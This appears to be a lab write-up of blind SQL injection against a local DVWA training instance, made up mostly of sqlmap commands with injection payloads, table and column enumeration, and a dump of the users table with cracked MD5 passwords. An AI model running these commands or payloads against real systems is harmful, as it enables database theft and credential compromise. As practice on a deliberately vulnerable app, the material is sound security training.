# Recon

> sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --batch --dbs --cookie="PHPSESSID=s4t13jonrotdorlreln2grunmm; security=low"

```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 4268=4268 AND 'WjAI'='WjAI&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 4278 FROM (SELECT(SLEEP(5)))DVom) AND 'rftm'='rftm&Submit=Submit
```

# Tables

> sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --batch --dbs --cookie="PHPSESSID=s4t13jonrotdorlreln2grunmm; security=low" -D dvwa --tables

```
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```

# Columns

> sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --batch --dbs --cookie="PHPSESSID=s4t13jonrotdorlreln2grunmm; security=low" -D dvwa -T users --columns

```
Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+
```

# Dump

> sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --batch --dbs --cookie="PHPSESSID=s4t13jonrotdorlreln2grunmm; security=low" -D dvwa -T users --dump

## Cracked passwords

```
[22:11:52] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'                             
[22:11:53] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'                            
[22:11:57] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'                           
[22:12:00] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'
```

```
Database: dvwa                                                                                                      
Table: users
[5 entries]
+---------+---------+----------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                           | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+----------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 3       | 1337    | /dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2022-07-22 21:19:41 | 0            |
| 1       | admin   | /dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2022-07-22 21:19:41 | 0            |
| 2       | gordonb | /dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2022-07-22 21:19:41 | 0            |
| 4       | pablo   | /dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2022-07-22 21:19:41 | 0            |
| 5       | smithy  | /dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2022-07-22 21:19:41 | 0            |
+---------+---------+----------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
```